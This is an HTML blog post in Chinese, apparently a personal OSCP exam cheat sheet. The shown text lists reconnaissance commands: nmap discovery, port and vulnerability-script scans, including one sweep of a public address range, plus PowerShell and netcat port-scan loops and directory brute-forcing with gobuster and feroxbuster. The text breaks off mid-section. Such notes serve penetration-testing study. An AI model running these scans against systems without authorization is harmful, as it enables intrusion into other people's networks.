<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
    <meta charset="UTF-8" />

    <meta name="generator" content="Hugo 0.103.1" /><meta name="theme-color" content="#16171d" />
    <meta name="color-scheme" content="light dark">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
    
    <meta http-equiv="Cache-Control" content="no-transform" />
    
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <title>仅针对OSCP考试的命令笔记 | Klear·blog</title>

    <link rel="stylesheet" href="/css/meme.min.dd324178793ecaeb5e4ba9c46e747b0b3a9009bf8a6a1517cbb627ead617f382.css"/>

    
    
        <script src="/js/meme.min.e46abe484398824efc70edec3126437916974df592d7c395b44f8f60e0f57e9d.js"></script>

    

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>

    <meta name="author" content="Klear" /><meta name="description" content="此命令笔记仅针对OSCP考试，不包括考试……" />

    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-title" content="Klear·blog" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="application-name" content="Klear·blog" />
    <meta name="msapplication-starturl" content="../../" />
    <meta name="msapplication-TileColor" content="#fff" />
    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
    <link rel="manifest" href="/manifest.json" />

    
    

    
    <link rel="canonical" href="https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/" />
    

<script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "BlogPosting",
        "datePublished": "2024-01-16T09:52:48+08:00",
        "dateModified": "2024-01-16T16:52:02+08:00",
        "url": "https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/",
        "headline": "仅针对OSCP考试的命令笔记",
        "description": "此命令笔记仅针对OSCP考试，不包括考试……",
        "inLanguage" : "zh-CN",
        "articleSection": "post",
        "wordCount":  11242 ,
        "image": "https://klearcc.github.io/icons/avatar.png",
        "author": {
            "@type": "Person",
            "description": "失败的人爱bb",
            "email": "baicaix86@gmail.com",
            "image": "https://klearcc.github.io/icons/avatar.png",
            "url": "https://klearcc.github.io/",
            "name": "Klear"
        },
        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
        "publisher": {
            "@type": "Organization",
            "name": "Klear·blog",
            "logo": {
                "@type": "ImageObject",
                "url": "https://klearcc.github.io/icons/avatar.png"
            },
            "url": "https://klearcc.github.io/"
        },
        "mainEntityOfPage": {
            "@type": "WebSite",
            "@id": "https://klearcc.github.io/"
        }
    }
</script>

    

<meta name="twitter:card" content="summary" />

<meta name="twitter:site" content="@En0langg" />
<meta name="twitter:creator" content="@En0langg" />

    



<meta property="og:title" content="仅针对OSCP考试的命令笔记" />
<meta property="og:description" content="此命令笔记仅针对OSCP考试，不包括考试……" />
<meta property="og:url" content="https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/" />
<meta property="og:site_name" content="Klear·blog" />
<meta property="og:locale" content="zh" /><meta property="og:image" content="https://klearcc.github.io/icons/avatar.png" />
    <meta property="og:type" content="article" />
    <meta property="article:published_time" content="2024-01-16T09:52:48&#43;08:00" />
    <meta property="article:modified_time" content="2024-01-16T16:52:02&#43;08:00" />
    
    <meta property="article:section" content="post" />



    
    

    
</head>

    <body>
        <div class="container">
            
    <header class="header">
        
            <div class="header-wrapper">
                <div class="header-inner single">
                    
    <div class="site-brand">
        
            <a href="/" class="brand">Klear·blog</a>
        
    </div>

                    <nav class="nav">
    <ul class="menu" id="menu">
        
            
        
        
        
        
            
                <li class="menu-item"><a href="/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon archive"><path d="M32 448c0 17.7 14.3 32 32 32h384c17.7 0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6 0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3 0 64v48c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"/></svg><span class="menu-item-name">首页</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/tags/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="icon tags"><path d="M497.941 225.941L286.059 14.059A48 48 0 0 0 252.118 0H48C21.49 0 0 21.49 0 48v204.118a48 48 0 0 0 14.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882 0l204.118-204.118c18.745-18.745 18.745-49.137 0-67.882zM112 160c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882 0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397 0h48.721a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882z"/></svg><span class="menu-item-name">标签</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/archives/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon archive"><path d="M32 448c0 17.7 14.3 32 32 32h384c17.7 0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6 0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3 0 64v48c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"/></svg><span class="menu-item-name">归档</span></a>
                </li>
            
        
            
                
                    
                    
                        <li class="menu-item">
                            <a id="theme-switcher" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5l48.8-97.5a18 18 0 0128 0l48.8 97.5 103.4 -34.5a18 18 0 0119.8 19.8l-34.5 103.4l97.5 48.8a18 18 0 010 28l-97.5 48.8 34.5 103.4a18 18 0 01-19.8 19.8l-103.4-34.5-48.8 97.5a18 18 0 01-28 0l-48.8-97.5l-103.4 34.5a18 18 0 01-19.8-19.8l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8-34.5-103.4a18 18 0 0119.8-19.8zM256 128a128 128 0 10.01 0M256 160a96 96 0 10.01 0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412a256 256 0 10154-407a11.5 11.5 0 00-5 20a201.5 201.5 0 01-134 374a11.5 11.5 0 00-15 13"/></svg></a>
                        </li>
                    
                
            
        
            
                
            
        
            
                
            
        
    </ul>
</nav>

                    
                </div>
            </div>
            
    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
    <label for="nav-toggle" class="nav-toggle"></label>
    <label for="nav-toggle" class="nav-curtain"></label>


        
    </header>




            
            
    <main class="main single" id="main">
    <div class="main-inner">

        

        <article class="content post h-entry" data-align="justify" data-type="post" data-toc-num="true">

            <h1 class="post-title p-name">仅针对OSCP考试的命令笔记</h1>

            

            
                
            

            
                

<div class="post-meta">
    
        
        <time datetime="2024-01-16T09:52:48&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2024.1.16</time>
    
    
        
        <time datetime="2024-01-16T16:52:02&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2024.1.16</time>
    
    
    
        
        
        
            
        
    
    
        
        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;11242</span>
    
    
        
        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;23&nbsp;分钟</span>
    
    
    
</div>

            

            <div class="post-body e-content">
                <h1 id="此命令笔记仅针对oscp考试不包括考试内容攻击方式随时更新"><a href="#此命令笔记仅针对oscp考试不包括考试内容攻击方式随时更新" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>此命令笔记仅针对OSCP考试，不包括考试内容、攻击方式。随时更新</h1>
<h3 id="httpsgithubcomklearccnotesblobmainoscp考试命令笔记md"><a href="#httpsgithubcomklearccnotesblobmainoscp考试命令笔记md" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="https://github.com/Klearcc/Notes/blob/main/oscp" target="_blank" rel="noopener">https://github.com/Klearcc/Notes/blob/main/oscp</a>考试命令笔记.md</h3>
<h1 id="toc"><a href="#toc" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Toc</h1>
<pre tabindex="0"><code class="language-table-of-contents" data-lang="table-of-contents">style: nestedList # TOC style (nestedList|inlineFirstLevel)
maxLevel: 0 # Include headings up to the speficied level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
</code></pre><h2 id="信息收集"><a href="#信息收集" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>信息收集</h2>
<h3 id="nmap"><a href="#nmap" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>nmap</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">### 3389开，看机器上除了 Administrator 还有哪些用户</span>
</span></span><span class="line"><span class="cl">	rdesktop -u <span class="s1">&#39;&#39;</span> -a <span class="m">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### 只探活  少量主机不用--min参数</span>
</span></span><span class="line"><span class="cl">	nmap -v -sn -PE -n --min-hostgroup <span class="m">1024</span> --min-parallelism <span class="m">1024</span> -oX nmap_output.xml 121.23.6.0/24
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### 只端口 大量目标提速</span>
</span></span><span class="line"><span class="cl">	nmap -sS -Pn -n --open --min-hostgroup <span class="m">4</span> --min-parallelism <span class="m">1024</span> --host-timeout <span class="m">30</span> -T4 -v -oG result.txt -iL ip.txt
</span></span><span class="line"><span class="cl">	或
</span></span><span class="line"><span class="cl">	nmap -sS -Pn -n --open --min-hostgroup <span class="m">4</span> --min-parallelism <span class="m">1024</span> --host-timeout <span class="m">30</span> -T4 -v &lt;IP&gt; -p-
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### 考试</span>
</span></span><span class="line"><span class="cl">nmap -sV -Pn -v  -p 1-65535 --open 192.168.237.143-145 -oA <span class="m">192</span>
</span></span><span class="line"><span class="cl"><span class="c1">### 参数</span>
</span></span><span class="line"><span class="cl">--top-ports<span class="o">=</span><span class="m">20</span>
</span></span><span class="line"><span class="cl"><span class="c1">###筛选脚本</span>
</span></span><span class="line"><span class="cl">grep <span class="s1">&#39;exploits&#39;</span> /usr/share/nmap/scripts/*.nse
</span></span><span class="line"><span class="cl"><span class="c1">### 脚本详细信息</span>
</span></span><span class="line"><span class="cl">nmap --script-help<span class="o">=</span>clamav-exec.nse
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### tcp</span>
</span></span><span class="line"><span class="cl">	nmap -sS -sC -Pn -v -p 1-1000 192.168.50.0/24 192.168.45.0/24
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### udp</span>
</span></span><span class="line"><span class="cl">	nmap -sU -v -Pn -p 100-200 192.168.212.151
</span></span><span class="line"><span class="cl"><span class="c1">### 漏洞</span>
</span></span><span class="line"><span class="cl">sudo nmap -sV -p <span class="m">443</span> --script <span class="s2">&#34;vuln&#34;</span> 192.168.50.124
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nmap -sV --script <span class="s2">&#34;exploit&#34;</span> 192.168.242.10
</span></span><span class="line"><span class="cl">nmap -v -p 139,445 --script<span class="o">=</span>smb-os-discovery 10.11.1.227 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">### win扫描端口 powershell扫描端口</span>
</span></span><span class="line"><span class="cl">	ps&gt; 
</span></span><span class="line"><span class="cl">	1..1024 <span class="p">|</span> % <span class="o">{</span><span class="nb">echo</span> <span class="o">((</span>New-Object Net.Sockets.TcpClient<span class="o">)</span>.Connect<span class="o">(</span><span class="s2">&#34;192.168.229.151&#34;</span>, <span class="nv">$_</span><span class="o">))</span> <span class="s2">&#34;TCP port </span><span class="nv">$_</span><span class="s2"> is open&#34;</span><span class="o">}</span> 2&gt;<span class="nv">$null</span>
</span></span><span class="line"><span class="cl"><span class="c1">### linux扫端口  /usr/share/windows-resources/binaries/nc.exe</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">1</span> 254<span class="k">)</span><span class="p">;</span> <span class="k">do</span> nc -zv -w <span class="m">1</span> 172.16.50.<span class="nv">$i</span> 445<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="扫目录"><a href="#扫目录" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>扫目录</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 推荐</span>
</span></span><span class="line"><span class="cl">feroxbuster  -u  http://192.168.237.143/app 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gobuster dir -u 192.168.229.149 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dirsearch -u xxxx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gobuster dir -u http://192.168.231.16:5002/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -p pattern -t <span class="m">64</span>
</span></span><span class="line"><span class="cl">
